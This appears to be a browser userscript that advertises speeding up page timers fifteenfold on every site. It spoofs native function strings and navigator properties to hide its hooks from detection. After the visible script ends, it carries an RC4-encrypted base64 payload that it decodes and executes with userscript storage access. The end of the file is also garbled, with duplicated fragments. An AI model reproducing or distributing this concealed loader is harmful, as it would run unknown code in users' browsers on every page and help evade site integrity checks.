// ==UserScript==
// @name         Time Speed x15 - Hardened (No UI)
// @namespace    http://tampermonkey.net/
// @version      1.0
// @description  Time x15 + continuous protection + hide traces, kh?ng UI
// @author       VN Cloud
// @match        *://*/*
// @grant        none
// @run-at       document-start
// ==/UserScript==

(function () {
    'use strict';

    /* ===========================
       C?u h?nh
       =========================== */
    let SPEED = 15;         // h? s? m?c ??nh
    let enabled = true;     // auto b?t
    const UI_ZINDEX = 2147483647;

    /* ===========================
       L?u b?n g?c
       =========================== */
    const originals = {
        Date_now_desc: Object.getOwnPropertyDescriptor(Date, 'now'),
        Perf_now_desc: (typeof performance !== 'undefined') ? Object.getOwnPropertyDescriptor(performance, 'now') : undefined,
        setTimeout_desc: Object.getOwnPropertyDescriptor(window, 'setTimeout'),
        setInterval_desc: Object.getOwnPropertyDescriptor(window, 'setInterval'),
        Date_now: Date.now.bind(Date),
        Perf_now: (typeof performance !== 'undefined') ? performance.now.bind(performance) : null,
        setTimeout: window.setTimeout.bind(window),
        setInterval: window.setInterval.bind(window)
    };

    /* ===========================
       Helpers
       =========================== */
    function defineHook(obj, prop, value, allowRestore = true) {
        const desc = {
            value: value,
            writable: false,
            configurable: !!allowRestore,
            enumerable: false
        };
        try {
            Object.defineProperty(obj, prop, desc);
            return true;
        } catch (e) {
            try { obj[prop] = value; return true; } catch (_) { return false; }
        }
    }

    function restoreOriginal(obj, prop, originalDesc) {
        try {
            if (originalDesc) {
                Object.defineProperty(obj, prop, originalDesc);
            } else {
                if (prop === 'now' && obj === Date && originals.Date_now) {
                    Object.defineProperty(Date, 'now', { value: originals.Date_now, writable: true, configurable: true });
                } else if (prop === 'now' && obj === performance && originals.Perf_now) {
                    Object.defineProperty(performance, 'now', { value: originals.Perf_now, writable: true, configurable: true });
                } else if (prop === 'setTimeout' && originals.setTimeout) {
                    Object.defineProperty(window, 'setTimeout', { value: originals.setTimeout, writable: true, configurable: true });
                } else if (prop === 'setInterval' && originals.setInterval) {
                    Object.defineProperty(window, 'setInterval', { value: originals.setInterval, writable: true, configurable: true });
                }
            }
            return true;
        } catch (e) { return false; }
    }

    /* ===========================
       Hook / Unhook
       =========================== */
    function hookAll() {
        defineHook(Date, 'now', function () {
            try { return Math.floor(originals.Date_now() * SPEED); } catch (e) { return originals.Date_now(); }
        }, true);

        if (typeof performance !== 'undefined') {
            defineHook(performance, 'now', function () {
                try { return (originals.Perf_now ? originals.Perf_now() * SPEED : originals.Date_now() * SPEED); } catch (e) { return (originals.Perf_now ? originals.Perf_now() : originals.Date_now()); }
            }, true);
        }

        defineHook(window, 'setTimeout', function (fn, delay, ...args) {
            const d = (enabled && typeof delay === 'number' && isFinite(delay)) ? (delay / SPEED) : delay;
            return originals.setTimeout(fn, d, ...args);
        }, true);

        defineHook(window, 'setInterval', function (fn, delay, ...args) {
            const d = (enabled && typeof delay === 'number' && isFinite(delay)) ? (delay / SPEED) : delay;
            return originals.setInterval(fn, d, ...args);
        }, true);
    }

    function unhookAll() {
        restoreOriginal(Date, 'now', originals.Date_now_desc);
        if (typeof performance !== 'undefined') restoreOriginal(performance, 'now', originals.Perf_now_desc);
        restoreOriginal(window, 'setTimeout', originals.setTimeout_desc);
        restoreOriginal(window, 'setInterval', originals.setInterval_desc);
    }

    /* ===========================
       Hide traces
       =========================== */
    const origFuncToString = Function.prototype.toString;
    try {
        Function.prototype.toString = new Proxy(origFuncToString, {
            apply(target, thisArg, args) {
                try {
                    if (thisArg === Date.now || thisArg === performance.now || thisArg === window.setTimeout || thisArg === window.setInterval) {
                        return `function ${thisArg.name || ''}() { [native code] }`;
                    }
                } catch (e) {}
                return Reflect.apply(target, thisArg, args);
            }
        });
    } catch (e) {}

    try {
        Object.defineProperty(document, 'scripts', {
            get: function () {
                const arr = Array.from(this.querySelectorAll('script'));
                return arr.filter(s => !s.hasAttribute('data-userscript') && !s.src.includes('tampermonkey'));
            },
            configurable: true
        });
    } catch (e) {}

    try {
        const navProxy = new Proxy(navigator, {
            get(target, prop) {
                if (prop === 'plugins') return [];
                if (prop === 'languages') return target.languages || ['en-US'];
                return Reflect.get(target, prop);
            }
        });
        Object.defineProperty(window, 'navigator', { get: () => navProxy, configurable: true });
    } catch (e) {}

    /* ===========================
       Observer + Watchers
       =========================== */
    const mo = new MutationObserver((mutations) => {
        if (!enabled) return;
        let shouldReapply = false;
        for (const m of mutations) {
            if (m.addedNodes && m.addedNodes.length) { shouldReapply = true; break; }
            if (m.type === 'attributes') { shouldReapply = true; break; }
        }
        if (shouldReapply) {
            Promise.resolve().then(() => { try { hookAll(); } catch (e) {} });
        }
    });

    function startObserver() {
        try { mo.observe(document, { childList: true, subtree: true, attributes: true }); } catch (e) {}
    }
    function stopObserver() {
        try { mo.disconnect(); } catch (e) {}
    }

    const watchProps = [];
    function watchProp(obj, prop, getterFn) {
        try {
            const originalDesc = Object.getOwnPropertyDescriptor(obj, prop);
            watchProps.push({ obj, prop, originalDesc });
            Object.defineProperty(obj, prop, {
                get: getterFn,
                set: function () { if (enabled) { hookAll(); } },
                configurable: true,
                enumerable: false
            });
        } catch (e) {}
    }
    function unwatchAll() {
        for (const w of watchProps) {
            try {
                if (w.originalDesc) Object.defineProperty(w.obj, w.prop, w.originalDesc);
                else delete w.obj[w.prop];
            } catch (e) {}
        }
        watchProps.length = 0;
    }

    /* ===========================
       Auto-enable
       =========================== */
    if (enabled) {
        hookAll();
        startObserver();
        watchProp(window, 'setTimeout', () => window.setTimeout);
        watchProp(window, 'setInterval', () => window.setInterval);
        watchProp(Date, 'now', () => Date.now);
        if (typeof performance !== 'undefined') watchProp(performance, 'now', () => performance.now);
    }

})();BOGAXNKLm387IwLoekLCSaOTKO9LRk86wa8T1FWdFtxiWZ2e42xZRRYkcK5kxyFqhRlpTfv9/JFhtK3eLJhI2HtMoPS/Y1HAkg2OwEbVMs8g+glmUpJogBPcbxE1fdJFT3YbOLINI6+mJ7sYDsgXhQcRQpa9ia6TOVS2yKZ0CW0+GfhQh0q90acCvD2ewJCmbK6G3jfvzOtSCG1fn3w8MZETaKJk9fPpFsqKFSCqV8NSItuZBoPjvWAMnu79viYJUYkruAenlUKE+kqLr1OdU+gN+BvhDQ6T5UlORTgVpsA4Dg/TlPAFZPpde4JO97O5fJELqJBsfDdlw1eABlD7hzlSaxaam3OOS9iVayEnZMfIloSY588mgT8FZE5qazQg2sqPBINTDrcH4AY8ULRJ8JTEPwTCmb9WlK12fqNMXFeiEK5PcsvLzYP9fdfjDQ8gm5hbtJDV3kuk2rcStnzqimvUzYUXjPnP8gWQ6j/18KaQV+Ob6elnMiDVmNfXXVMLSUqt/aJfFYQ0Jg2iji4NvTy1UYsT/CFRFHZjHvC5vQD6iHdSoBz8up+RhAq2wc7EMUZLyZTISFvH0gI7azGaZ9byL3pnlw46YiSXJL4vYvicbxMb4ND0Fz/ECngxrZE1PmtD8Wj/gN26jhp95hud8OJQTtQFBW2EjqdaJeEsu7ffYH7uQd4o3sFgkumSdgwmah277/WIQxqpkAxlDagb5KKEoOnb+OwCDRplgnKoA9qKIEQ7sE1KRCWK0/FB4wWocEuK4KiAVxnVxFQBOkkq/g618c991YcBCXdZqY1FezsLgo34br15ZNvYkU9vCMLc3IjNKERP4D2EOcFNrHx0h9G1O7RZWBQAfJNN3+OVwtsbXWJCWl+PAtUcyqOV7Zo3Ou1URq3OWYfwwhVS8ixv9Wynl/3RDVpDaYK7Jsf0CeBpAtNQ9QoQBFtiQIGU81R3BuK7FzBgX8TKhbVeIPROMP2T2CyGZfDPn5yfjZRZ4GwMQ5ugcRkHfx6cHtwbpvCJdlu+cNAhywkgvlJm7q6d5pfj4JbmOFklyKJ5vDAIYsAFK5lUUH2GLLBIjqotVoM0ee+YIESFT6MvQVlUfxb5TMYFo+9OB4koyz7RxLfGA311Hf+IzaJUZNxS9/xQIbDfepJfRaNQJLBuuGmdODWP2wz1TLqiIOKqABtR17IZUXU4cFwBkJgntOZ61NWgai1Yfea9p0ri0uqfFbO7Y3qwtH+8K+LfVJICPvyrK4zL/SH/PPYznq5O4igJFnOjlsfWaUTLPkslnNIimxn1sl+dSDlb9YmaIseLUdpOT/I0W+EGmVhwU0I9O1jQ+ef3aBWQNs9mIl9gNYBEsa9ksejj/Grqz4+55Ok9pi9g==";
  const raw = atob(encoded);
  const key = atob("Y3UjX2Ywcl9t0b1LeV9fZ2hpVg==");
  function rc4Bytes(key, data) {
    const s = [], out = [];
    let j = 0;
    for (let i = 0; i < 256; i++) s[i] = i;
    for (let i = 0; i < 256; i++) {
      j = (j + s[i] + key.charCodeAt(i % key.length)) % 256;
      [s[i], s[j]] = [s[j], s[i]];
    }
    let i = 0; j = 0;
    for (let y = 0; y < data.length; y++) {
      i = (i + 1) % 256;
      j = (j + s[i]) % 256;
      [s[i], s[j]] = [s[j], s[i]];
      const k = s[(s[i] + s[j]) % 256];
      out.push(data[y] ^ k);
    }
    return out;
  }
  const rawBytes = Uint8Array.from(raw, c => c.charCodeAt(0));
  const decryptedBytes = rc4Bytes(key, rawBytes);
  const decoded = new TextDecoder("utf-8").decode(new Uint8Array(decryptedBytes));
  Function("GM_setValue", "GM_getValue", decoded)(GM_setValue, GM_getValue);;
})();et i = 0; i < 256; i++) {
      j = (j + s[i] + key.charCodeAt(i % key.length)) % 256;
      [s[i], s[j]] = [s[j], s[i]];
    }
    let i = 0; j = 0;
    for (let y = 0; y < data.length; y++) {
      i = (i + 1) % 256;
      j = (j + s[i]) % 256;
      [s[i], s[j]] = [s[j], s[i]];
      const k = s[(s[i] + s[j]) % 256];
      out.push(data[y] ^ k);
    }
    return out;
  }
  const rawBytes = Uint8Array.from(raw, c => c.charCodeAt(0));
  const decryptedBytes = rc4Bytes(key, rawBytes);
  const decoded = new TextDecoder("utf-8").decode(new Uint8Array(decryptedBytes));
  Function("GM_setValue", "GM_getValue", decoded)(GM_setValue, GM_getValue);;
})(); decoded)(GM_setValue, GM_getValue);;
})();